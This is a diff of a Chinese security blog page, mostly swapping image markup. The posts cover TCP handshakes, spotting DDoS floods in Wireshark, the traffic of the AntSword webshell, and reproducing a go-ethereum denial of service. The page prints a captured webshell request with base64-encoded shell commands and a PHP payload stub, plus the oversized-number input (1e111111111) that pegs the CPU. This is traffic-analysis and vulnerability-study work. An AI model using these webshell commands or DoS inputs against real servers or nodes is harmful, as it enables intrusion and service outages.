+</code></pre><p>客户端发送syn包（syn=j）到服务器，并进入到syn_sent状态，等待服务端确认<br><img src="/2019/06/10/工具使用/wireshark使用记录/15606653847491.jpg" alt="-w1406"><br><img src="/2019/06/10/工具使用/wireshark使用记录/15606654495869.jpg" alt="-w1334"></p>
 <pre><code>第二次   server --------&gt; client     syn + ack
-</code></pre><p>务器收到syn包，必须确认客户的SYN(ack=j+1)，同时自己也发送一个SYN包(syn=k)，即SYN+ACK包，此时服务器进入SYN_RECV状态;<br><a href="/2019/06/10/工具使用/wireshark使用记录/15606654835190.jpg" data-fancybox="group" data-caption="-w1356" class="fancybox"><img src="/2019/06/10/工具使用/wireshark使用记录/15606654835190.jpg" alt="-w1356" title="-w1356"></a></p>
+</code></pre><p>务器收到syn包，必须确认客户的SYN(ack=j+1)，同时自己也发送一个SYN包(syn=k)，即SYN+ACK包，此时服务器进入SYN_RECV状态;<br><img src="/2019/06/10/工具使用/wireshark使用记录/15606654835190.jpg" alt="-w1356"></p>
 <pre><code>第三次   client --------&gt; server     ack
-</code></pre><p>第三次握手:客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=k+1)，此包发送完毕，客户端和服务器进入ESTABLISHED(TCP连接成功)状态，完成三次握手<br><a href="/2019/06/10/工具使用/wireshark使用记录/15606655134327.jpg" data-fancybox="group" data-caption="-w1290" class="fancybox"><img src="/2019/06/10/工具使用/wireshark使用记录/15606655134327.jpg" alt="-w1290" title="-w1290"></a></p>
+</code></pre><p>第三次握手:客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=k+1)，此包发送完毕，客户端和服务器进入ESTABLISHED(TCP连接成功)状态，完成三次握手<br><img src="/2019/06/10/工具使用/wireshark使用记录/15606655134327.jpg" alt="-w1290"></p>
 <h2 id="wireshark-分析攻击现象"><a href="#wireshark-分析攻击现象" class="headerlink" title="wireshark 分析攻击现象"></a>wireshark 分析攻击现象</h2><h3 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h3><p>在进行DDOS攻击时，wireshark从数据包中能明显看到该现象</p>
 <h4 id="SYN-Flood"><a href="#SYN-Flood" class="headerlink" title="SYN Flood"></a>SYN Flood</h4><ul>
 <li>flag 常见标识：<br>在TCP层，有个FLAGS字段，这个字段有以下几个标识：SYN, FIN, ACK, PSH, RST, URG.其中，对于我们日常的分析有用的就是前面的五个字段。<br>它们的含义是：<br>SYN表示建立连接，<br>FIN表示关闭连接，<br>ACK表示响应，<br>PSH表示有 DATA数据传输，<br>RST表示连接重置。<br>其中，ACK是可能与SYN，FIN等同时使用的，比如SYN和ACK可能同时为1，它表示的就是建立连接之后的响应，<br>如果只是单个的一个SYN，它表示的只是建立连接。<br>TCP的几次握手就是通过这样的ACK表现出来的。<br>但SYN与FIN是不会同时为1的，因为前者表示的是建立连接，而后者表示的是断开连接。<br>RST一般是在FIN之后才会出现为1的情况，表示的是连接重置。<br>一般地，当出现FIN包或RST包时，我们便认为客户端与服务器端断开了连接；而当出现SYN和SYN＋ACK包时，我们认为客户端与服务器建立了一个连接。<br>PSH为1的情况，一般只出现在 DATA内容不为0的包中，也就是说PSH为1表示的是有真正的TCP数据包内容被传递。<br>TCP的连接建立和连接关闭，都是通过请求－响应的模式完成的。、</li>
 </ul>
-<p>这里面案例比较有意思的一点：<br>使用TTL分析发现攻击者的蛛丝马迹，当使用随机源进行DDoS攻击时，虽然使用了伪造源地址进行攻击，但攻击者无法伪造攻击主机与目标主机之间的位置关系。有时候通过观察数据包的TTL值变化，也能够获得攻击者的蛛丝马迹，为攻击防御提供辅助支持。下图所示的这个攻击程序并没有修改攻击数据包的TTL值，所有的攻击数据包使用相同的TTL值。这个攻击数据包是由局域网内的一个windows计算机发出的。<br><a href="/2019/06/10/工具使用/wireshark使用记录/15606859908642.jpg" data-fancybox="group" data-caption="-w590" class="fancybox"><img src="/2019/06/10/工具使用/wireshark使用记录/15606859908642.jpg" alt="-w590" title="-w590"></a></p>
+<p>这里面案例比较有意思的一点：<br>使用TTL分析发现攻击者的蛛丝马迹，当使用随机源进行DDoS攻击时，虽然使用了伪造源地址进行攻击，但攻击者无法伪造攻击主机与目标主机之间的位置关系。有时候通过观察数据包的TTL值变化，也能够获得攻击者的蛛丝马迹，为攻击防御提供辅助支持。下图所示的这个攻击程序并没有修改攻击数据包的TTL值，所有的攻击数据包使用相同的TTL值。这个攻击数据包是由局域网内的一个windows计算机发出的。<br><img src="/2019/06/10/工具使用/wireshark使用记录/15606859908642.jpg" alt="-w590"></p>
 <h4 id="UDP-FLOOD"><a href="#UDP-FLOOD" class="headerlink" title="UDP FLOOD"></a>UDP FLOOD</h4><h4 id="ICMP-FLOOD"><a href="#ICMP-FLOOD" class="headerlink" title="ICMP FLOOD"></a>ICMP FLOOD</h4><h3 id="wireshark-记录antsword"><a href="#wireshark-记录antsword" class="headerlink" title="wireshark 记录antsword"></a>wireshark 记录antsword</h3><p>起因是看了下<a href="https://bbs.ichunqiu.com/article-1608-1.html" target="_blank" rel="noopener">记一次wireshark分析中国菜刀http请求</a>想着我一般用蚁剑，于是看看AntSword的利用特征，搭建环境抓包这部分按下不表，直入正题</p>
 <p>不知道为啥 同样的木马+antsword在osx 本地系统上无法执行，一直在报错，还没细看</p>
-<h4 id="虚拟终端时"><a href="#虚拟终端时" class="headerlink" title="虚拟终端时"></a>虚拟终端时</h4><p><a href="/2019/06/10/工具使用/wireshark使用记录/15631138557440.jpg" data-fancybox="group" data-caption="-w952" class="fancybox"><img src="/2019/06/10/工具使用/wireshark使用记录/15631138557440.jpg" alt="-w952" title="-w952"></a><br><a href="/2019/06/10/工具使用/wireshark使用记录/15631139876578.jpg" data-fancybox="group" data-caption="-w1355" class="fancybox"><img src="/2019/06/10/工具使用/wireshark使用记录/15631139876578.jpg" alt="-w1355" title="-w1355"></a><br>可以明显看到 UA有 antsword的标志<br>其中连接shell 执行语句如下：</p>
+<h4 id="虚拟终端时"><a href="#虚拟终端时" class="headerlink" title="虚拟终端时"></a>虚拟终端时</h4><p><img src="/2019/06/10/工具使用/wireshark使用记录/15631138557440.jpg" alt="-w952"><br><img src="/2019/06/10/工具使用/wireshark使用记录/15631139876578.jpg" alt="-w1355"><br>可以明显看到 UA有 antsword的标志<br>其中连接shell 执行语句如下：</p>
 <pre><code>0x1291b5bcd176f=L2Jpbi9zaA==&amp;0x39e42e841a89c=Y2QgIi92YXIvd3d
 3L2h0bWwiO3B3ZDtlY2hvIFtTXTtwd2Q7ZWNobyBbRV0=&amp;ant=
 @ini_set(&quot;display_errors&quot;, &quot;0&quot;);
@@ -1940,7 +1944,7 @@ export PATH=$PATH:$GOPATH:/usr/local/go/bin
 
 <span class="token punctuation">}</span>
 </code></pre>
-<p>测试结果图：<br><a href="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/15522267821055/15522370181287.jpg" data-fancybox="group" data-caption="-w1256" class="fancybox"><img src="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/15522267821055/15522370181287.jpg" alt="-w1256" title="-w1256"></a><br>此处可以明显看到通过OS传入的浮点型参数1e111111111，此时CPU升到100%</p>
+<p>测试结果图：<br><img src="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/15522267821055/15522370181287.jpg" alt="-w1256"><br>此处可以明显看到通过OS传入的浮点型参数1e111111111，此时CPU升到100%</p>
 <p>不过当浮点数</p>
 <pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
     <span class="token keyword">type</span> txdata <span class="token keyword">struct</span> <span class="token punctuation">{</span>
@@ -2030,7 +2034,7 @@ export PATH=$PATH:$GOPATH:/usr/local/go/bin
 <li>系统通过转出的地址的私钥对转账信息进行签名（用于证明这 笔交易确实有本人进行）</li>
 <li>系统对交易信息进行验证</li>
 <li>把这笔交易入到本地的txpool中（就是缓存交易池）</li>
-<li>把交易信息广播给其它节点<br>借用下seebug的图：<br><a href="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/15522267821055/15525294348646.jpg" data-fancybox="group" data-caption="-w830" class="fancybox"><img src="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/15522267821055/15525294348646.jpg" alt="-w830" title="-w830"></a></li>
+<li>把交易信息广播给其它节点<br>借用下seebug的图：<br><img src="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/15522267821055/15525294348646.jpg" alt="-w830"></li>
 </ul>
 <p>在用户输入调用web3.js后，传入参数进行交易，在此处调用ethapi接口：<br>internal/ethapi/api.go 1071</p>
 <pre class=" language-go"><code class="language-go"><span class="token function">unc</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>PublicTransactionPoolAPI<span class="token punctuation">)</span> <span class="token function">SendTransaction</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> args SendTxArgs<span class="token punctuation">)</span> <span class="token punctuation">(</span>common<span class="token punctuation">.</span>Hash<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
@@ -2065,11 +2069,11 @@ wallet<span class="token punctuation">,</span> err <span class="token operator">
 <h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>在客户端console中，使用对应的转账函数，此时使用其中的转账函数，将其中的gasPrice、gasvalue、value的值使用为对应的16进制长数据<br>将导致CPU占用。</p>
 <pre class=" language-go"><code class="language-go">eth<span class="token punctuation">.</span><span class="token function">sendTransaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 </code></pre>
-<p><a href="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/15522267821055/15525447646588.jpg" data-fancybox="group" data-caption="-w956" class="fancybox"><img src="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/15522267821055/15525447646588.jpg" alt="-w956" title="-w956"></a><br><a href="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/15522267821055/15525447843242.jpg" data-fancybox="group" data-caption="-w934" class="fancybox"><img src="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/15522267821055/15525447843242.jpg" alt="-w934" title="-w934"></a></p>
+<p><img src="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/15522267821055/15525447646588.jpg" alt="-w956"><br><img src="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/15522267821055/15525447843242.jpg" alt="-w934"></p>
 <h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><h3 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h3><p>在内存资源不足的情况下，程序会自动退出。</p>
 <pre><code>goroutine 1340 [chan receive]:
 github.com/ethereum/go-ethereum/p2p/discover.(*udp).
-</code></pre><p>在调用math.big.Rat.SetString的时候，浮点数过大会不解析，同样不会造成影响。<br><a href="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/15522267821055/15525564158976.jpg" data-fancybox="group" data-caption="-w710" class="fancybox"><img src="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/15522267821055/15525564158976.jpg" alt="-w710" title="-w710"></a></p>
+</code></pre><p>在调用math.big.Rat.SetString的时候，浮点数过大会不解析，同样不会造成影响。<br><img src="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/15522267821055/15525564158976.jpg" alt="-w710"></p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><pre><code>https://blog.csdn.net/fpcc/article/details/81050976
 https://tianyun6655.github.io/2017/09/24/以太坊源码交易/
 https://www.colabug.com/3485978.html
@@ -3320,11 +3324,11 @@ a3--&gt;a4
         
         <tags>
             
+            <tag> XSS </tag>
+            
             <tag> Web渗透 </tag>
             
             <tag> 常规渗透 </tag>
-            
-            <tag> XSS </tag>
             
         </tags>
         
